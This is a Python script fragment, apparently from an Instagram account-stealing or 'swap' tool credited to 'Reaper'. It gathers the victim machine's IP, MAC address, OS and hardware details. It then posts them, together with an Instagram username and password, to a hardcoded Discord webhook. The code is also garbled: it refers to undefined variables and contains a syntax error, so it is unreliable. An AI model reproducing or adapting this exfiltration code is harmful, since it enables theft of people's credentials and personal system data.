import json
import os
import platform
import random
import re
import sqlite3
import subprocess
import threading
import uuid
import wmi
import requests 
by='''
[👁] cyber.reaper
'''

ip = requests.get('https://api.ipify.org').text
mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
computer_os = platform.platform()
cpu = wmi.WMI().Win32_Processor()[0]
ram = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)
gpu = wmi.WMI().Win32_VideoController()[0]
value=f''' **PC Username:** `{username}`\n **PC Name:** `{hostname}`\n **OS:** `{computer_os}`\n\n **IP:** `{ip}`\n **MAC:** `{mac}`\n **HWID:** `{hwid}`\n\n **CPU:** `{cpu.Name}`\n **GPU:** `{gpu.Name}`\n **RAM:** `{ram}GB`''',inline=False)

Webhook = "https://discord.com/api/webhooks/874210942693548102/RSA0kBsLlQbO0XEM_CdTSbDsBEH2xfCByGkPfZsNWl7PZ727YA2jOckBGRzEkGU1zWan"
data = {}
data["embeds"] = [
            {
                #"title" : f"Details...",
                "description" : f"**``fucked``** **[@{self.username}](https://instagram.com/{self.user})**\n***`password : {self.password}**\n**{value}| claimed By Reaper`***",
                #"color": 2895667,
                "thumbnail" : {
                    "url": "https://i.pinimg.com/originals/70/56/56/705656e8c01d3668bc496bef826a21f6.gif"},
        
                "footer" : {
                "text": f'\t\t By  Reaper',
                #"icon_url": "https://cdn.discordapp.com/attachments/873022739349381173/873507948700262430/ezgif.com-gif-maker.gif"
                    
                },
                "author" :{
                    "name" : "Red eye  V0.1 Swap"
                }
                
            }
        ]
requests.post(Webhook, json=data)
